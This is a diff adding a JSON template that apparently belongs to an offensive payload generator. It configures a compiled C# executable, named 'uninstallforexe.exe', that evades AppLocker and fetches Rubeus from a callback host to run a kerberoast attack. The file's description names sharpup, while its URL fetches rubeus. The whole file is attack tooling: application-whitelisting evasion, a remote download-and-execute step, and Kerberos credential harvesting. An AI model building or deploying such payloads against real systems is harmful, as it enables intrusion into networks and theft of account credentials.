@@ -1,0 +1,48 @@
+{
+    "categories": [
+        "exe",
+        "applocker"
+    ],
+    "description": "Downloads and runs sharpup, evading applocker.",
+    "contentFile": "exeapplockerexe.txt",
+    "customAttributes": [
+        {
+            "name": "callbackURL",
+            "description": "Executable will call back and execute the executable here.",
+            "defaultValue": "http://192.168.45.205/tools/rubeus.exe"
+        },
+        {
+            "name" : "commandlineArguments",
+            "description" : "Pass arguments to the executable. Should looks like this [\"-c\",\"-b value\",\"-a\"]. Note the -a and -c is a switch with no value.",
+            "defaultValue": "\"kerberoast\",\"/nowrap\""
+        
+        },
+        {
+            "name": "compile",
+            "description": "Whether or not to compile. Y/N",
+            "defaultValue": "Y"
+        }
+    ],
+    "shellCode": {
+        "hasShellCode": false
+    },
+    "compilation": {
+        "compilationType": "csharp",
+        "target": "exe",
+        "requiredAssemblies" : [
+            "System.Configuration.Install.dll"
+        ],
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of file to be created, can be full path or just a name",
+                "defaultValue": "uninstallforexe.exe"
+            }
+        ]
+    }
+}
